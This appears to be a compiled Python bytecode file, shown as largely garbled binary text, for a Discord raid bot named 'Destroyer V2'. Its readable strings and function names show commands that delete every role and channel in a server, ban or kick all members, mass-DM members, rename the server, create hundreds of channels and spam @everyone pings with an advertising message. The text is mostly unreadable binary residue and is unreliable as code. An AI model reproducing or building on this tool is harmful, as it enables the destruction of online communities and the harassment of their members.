U
    _·A  ã                	   @   sÄ  d dl Z d dlZd dlmZ d dlZd dlZd dlZd dlZd dlmZ d dl	Z	d dl
mZmZ d dlmZ d dlmZ e ¡  e	jj d¡ edZe e¡ZW 5 Q R X e d	¡Ze d
¡Zdd Zdd Ze  dd Ze  ¡ Zej dedZe !d¡ ej"dd Z#ej"dd Z$e %¡ dd Z&e %¡ dd Z'e %¡ dd Z(e %¡ dd Z)e %¡ d d! Z*e %¡ d"d# Z+e %¡ d$d Z,e %¡ d%d& Z-e %¡ d'd( Z.e %¡ d)d* Z/e  dS )+é    N)ÚFore)Úcontextmanager)ÚcommandsÚtasks)ÚCommandNotFound)ÚMissingRequiredArgumentúDestroyer V2 - Loading...zbot-config.jsonz	bot-tokenz
bot-prefixc                   C   s   t tj dtj dtj dtj dtj tjj dtjj tj dtjj dtj dtj	 d	tj d
tj
 dtj dtj t tj dtj  d S )NuÍ  
    
                    âââââââ ââââââ   ââââââ âââââââââ ââââââ   ââââââ âââ   âââââââââ  ââââââ
                    ââââ âââââ   â âââ    â â  âââ âââââ â âââââââ  ââââââ  âââââ   â âââ â âââ
                    âââ   ââââââ   â ââââ   â ââââ âââââ âââ âââââ  âââ âââ âââââââ   âââ âââ â
                    ââââ   ââââ  â   â   ââââ ââââ â âââââââ  âââ   âââ â ââââââââ  â âââââââ
                    âââââââ ââââââââââââââââ  ââââ â ââââ âââââ âââââââ â ââââââââââââââââ ââââ
                    âââ  â ââ ââ ââ âââ â â  â ââ   â ââ âââââ ââââââ   âââââ ââ ââ ââ ââ ââââ
                    â â  â  â â  ââ ââ  â â    â      ââ â ââ  â â ââ âââ âââ  â â  â  ââ â ââ
                    â â  â    â   â  â  â    â        ââ   â â â â â  â â ââ     â     ââ   â
                    â       â  â      â              â         â â  â â        â  â   â
                    â                                                 â â

                    z
Destroyer ZV2z | Logged in as ú#z | ID z
                    zMade by zhttps://youtube.com/snipcolaz / zSnipcola#0001z | Prefix: ú
    )Úprintr   ÚGREENÚRESETÚ	DestroyerÚuserÚnameÚdiscriminatorÚidÚREDZBLUEÚprefix© r   r   údestroyer.pyÚlaunchPrint    s:    
óó
óóóóóòóòó
òóñr   c                   C   s   t  d¡ d S )NÚcls)ÚosÚsystemr   r   r   r   ÚClear3   s    r   c                
   C   s®   t dkr@t  ttj dtj dtj dtj  t d¡ njz tj	t dd t
jj d¡ W n> tjjk
r   ttj dtj d	tj dtj  Y nX t d¡ d S )
Nzbot-token-herez[ERR] z;You forgot to put your token in the bot-config.json file.

z[SYS] Press any key to exit.z
pause >NULT)Z	reconnectr   zQThe token you put in the config file was incorrect, or I could not log into it.

)Útokenr   r   r   r   r   r   r   r   ÚrunÚctypesÚwindllÚkernel32ÚSetConsoleTitleWÚdiscordÚerrorsZLoginFailurer   r   r   r   Ú
Initialize:   s      ÿÿ ÿ
r$   zDestroyer V2)ZdescriptionZcommand_prefixÚhelpc                   Ã   sL   t   t  tjj dtjj dtjj	 ¡ tj
tjdddI d H  d S )NzDestroyer V2 - Logged in as r	   zsnipcola.xyz©r   )Zactivity)r   r   r   r   r    r!   r   r   r   r   Zchange_presencer"   ZGamer   r   r   r   Ú
on_connectZ   s    ÿr'   c                 Ã   s$   t |trd S t |trd S |d S )N)Ú
isinstancer   r   )ÚctxÚerrorr   r   r   Úon_command_errorj   s
    

r+   c                 Ã   s  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX | j	j
D ]t}z:| ¡ I d H  ttj dtj dtj | tj  W q   ttj dtj dtj | tj  Y qX qd S )	Nõ   âú[SYS] úCouldn't react to message.é   úCouldn't delete message.z[DELETE ROLES] úDeleted the role úCouldn't delete the role )ÚmessageÚadd_reactionr   r   r   r   ÚasyncioÚsleepÚdeleteÚguildÚrolesr   ÚYELLOW)r)   Úroler   r   r   Údelroless   s    $$,r<   c                 Ã   s  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX | j	j
D ]t}z:| ¡ I d H  ttj dtj dtj | tj  W q   ttj dtj dtj | tj  Y qX qd S )	Nr,   r-   r.   r/   r0   z[DELETE CHANNELS] úDeleted the channel úCouldn't delete the channel )r3   r4   r   r   r   r   r5   r6   r7   r8   Úchannelsr   r:   )r)   Úchannelr   r   r   Údelchannels   s    $$,rA   c                 Ã   s  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX | j	j
D ]x}z>|jddI d H  ttj dtj d	tj | tj  W q   ttj dtj d
tj | tj  Y qX qd S )Nr,   r-   r.   r/   r0   zKicked by Destroyer V2©Úreasonz[KICK ALL] zKicked the user zCouldn't kick the user )r3   r4   r   r   r   r   r5   r6   r7   r8   ÚmembersZkickr   r:   ©r)   Úmemberr   r   r   Úkickall   s    $$,rG   c                 Ã   s  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX | j	j
D ]x}z>|jddI d H  ttj dtj d	tj | tj  W q   ttj dtj d
tj | tj  Y qX qd S )Nr,   r-   r.   r/   r0   úBanned by Destroyer V2rB   z
[BAN ALL] úBanned the user úCouldn't ban the user )r3   r4   r   r   r   r   r5   r6   r7   r8   rD   Úbanr   r:   rE   r   r   r   Úbanall¯   s    $$,rL   c                Ã   s2  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX | j	j
D ]}zJ| |¡I d H  ttj dtj dtj | tj d| d	
tj  W q   ttj dtj d
tj | tj d| d	
tj  Y qX qd S )Nr,   r-   r.   r/   r0   z	[DM ALL] úDMed the user z 'ú'úCouldn't DM the user )r3   r4   r   r   r   r   r5   r6   r7   r8   rD   Úsendr   r:   )r)   r3   rF   r   r   r   ÚdmallÃ   s    $$:rQ   c                 Ã   s¢   z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX t	  t
  d S )Nr,   r-   r.   r/   r0   )r3   r4   r   r   r   r   r5   r6   r7   r   r   ©r)   r   r   r   r   ×   s    $$r   c              T   Ã   sî  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX tdtj	 dtj dtj	 t
 dtj d	tj dtj	 t
 d
tj dtj dtj	 t
 dtj dtj dtj	 t
 dtj dtj	 dtj dtj dtj	 t
 dtj dtj dtj	 t
 dtj dtj dtj	 t
 dtj dtj dtj	 t
 dtj dtj dtj	 t
 dtj dtj dtj	 t
 dtj dtj dtj	 dtj dStj  d S )Nr,   r-   r.   r/   r0   r
   zq=================================================== HELP MENU ===================================================zhelp - z)Shows a help 'menu' inside of the consolez
destroy - zÉThis command does the following - deletes all roles, channels, categories, dms all members,
               bans all members, and renames the server and then mass creates channels and mass ping everyoneznuke - z[This command does the following - deletes all roles, channels, categories, bans all memberszdmall z	[MESSAGE]z - z0This command DMs everyone what you want it to DMz	banall - zThis command bans everyonez
kickall - zThis command kicks everyonezdelchannels - z!This deletes every single channelzdelroles - zThis deletes every single rolezmassping - z+This pings everyone in every single channelzcls - zThis clears the consolezq=================================================================================================================)r3   r4   r   r   r   r   r5   r6   r7   r   r   r:   rR   r   r   r   r%   ç   sÐ    $$ÿÿÿþÿÿÿþÿÿÿþÿÿÿþúÿÿÿÿþÿÿÿþÿÿÿþÿÿÿþÿÿÿþÿÿÿþÿÿÿÿòc                 Ã   sD  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX | j	j
D ]x}z>|jddI d H  ttj dtj d	tj | tj  W q   ttj dtj d
tj | tj  Y qX q| j	jD ]v}z:| ¡ I d H  ttj dtj dtj | tj  W n4   ttj dtj dtj | tj  Y nX q| j	jD ]v}z:| ¡ I d H  ttj dtj dtj | tj  W n4   ttj dtj dtj | tj  Y nX qttj dtj dtj | j	j tj  d S )Nr,   r-   r.   r/   r0   rH   rB   z[NUKE] rI   rJ   r1   r2   r=   r>   zSuccessfully nuked )r3   r4   r   r   r   r   r5   r6   r7   r8   rD   rK   r   r:   r9   r?   r   )r)   rF   r;   r@   r   r   r   Únuke  s8    $$,0,2,2rS   c                 Ã   sâ  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX | j	j
D ]t}z:| ¡ I d H  ttj dtj dtj | tj  W q   ttj dtj dtj | tj  Y qX q| j	jD ]v}z:| ¡ I d H  ttj dtj d	tj | tj  W n4   ttj dtj d
tj | tj  Y nX q| j	jD ]}zL| | j	j d¡I d H  ttj dtj dtj | tj tj  W n:   ttj dtj dtj | tj tj  Y nX q| j	jD ]z}z>|jddI d H  ttj dtj dtj | tj  W n4   ttj dtj dtj | tj  Y nX q0d}zD| j	j|dI d H  ttj dtj dtj d| dtj  W n8   ttj dtj dtj d| dtj  Y nX d}d}|dk räzP|d7 }| j	 |¡I d H  ttj dtj dtj d| d| d
tj  W nN   ttj dtj dtj d| dtj dtj dtj  Y qäY nX q6d}|t| j	jk rÀ| j	jD ]¸}z^|d7 }| d ¡I d H  ttj dtj d!tj d|j d| d"t| j	j d#tj  W nR   ttj dtj d$tj d|j dtj dtj dtj  Y  qèY nX qqèttj dtj d%tj  d S )&Nr,   r-   r.   r/   r0   z
[DESTROY] r1   r2   r=   r>   z was destroyed by Destroyer V2. You will now (possibly) be banned.
Destroyer V2 was made by Snipcola, and you can get it at https://youtube.com/snipcola.rM   rO   rH   rB   rI   rJ   zDestroyed by Destroyer V2r&   zChanged the server name to rN   z#Couldn't change the server name to r   zdestroyed-by-destroyer-v2iô  zCreated a channel named ú' [z/500]z Couldn't create a channel named Ú.ú
 Aborting.z®This server was destroyed by Destroyer V2. 
Destroyer V2 was made by Snipcola, and you can get it at https://@everyone@youtube.com/snipcola or https://@everyone@snipcola.xyz.úPinged everyone in ú/ú]úCouldn't ping everyone in zSuccessfully destroyed server.)r3   r4   r   r   r   r   r5   r6   r7   r8   r9   r   r:   r?   rD   rP   r   rK   ZeditZcreate_text_channelÚlen)r)   r;   r@   rF   Z
serverNameZchannelCountZchannelNameÚ	pingCountr   r   r   Údestroy(  sx    $$,0,228,202
6<F>r]   c                 Ã   sl  z| j  d¡I d H  W n*   ttj dtj dtj  Y nX t d¡I d H  z| j  ¡ I d H  W n*   ttj dtj dtj  Y nX d}|t	| j
jk rh| j
jD ]´}z^|d7 }| d¡I d H  ttj dtj d	tj d
|j d| dt	| j
j dtj  W q°   ttj dtj dtj d
|j d
tj dtj dtj  Y  qY q°X q°qd S )Nr,   r-   r.   r/   r0   r   z«This server was raided by Destroyer V2. 
Destroyer V2 was made by Snipcola, and you can get it at https://@everyone@youtube.com/snipcola or https://@everyone@snipcola.xyz.z[MASS PING] rW   rN   rT   rX   rY   rZ   rU   rV   )r3   r4   r   r   r   r   r5   r6   r7   r[   r8   r?   rP   r   r:   r   )r)   r\   r@   r   r   r   Úmasspingo  s&    $$F>r^   )0r"   Zcoloramar   r   Zjsonr5   ÚsignalÚ
contextlibr   r   Zdiscord.extr   r   Zdiscord.ext.commandsr   r   Zinitr   r    r!   ÚopenÚfÚloadZconfigÚgetr   r   r   r   r$   ZClientr   ZBotZremove_commandZeventr'   r+   Zcommandr<   rA   rG   rL   rQ   r   r%   rS   r]   r^   r   r   r   r   Ú<module>   sl   ÿ


þ










#
F
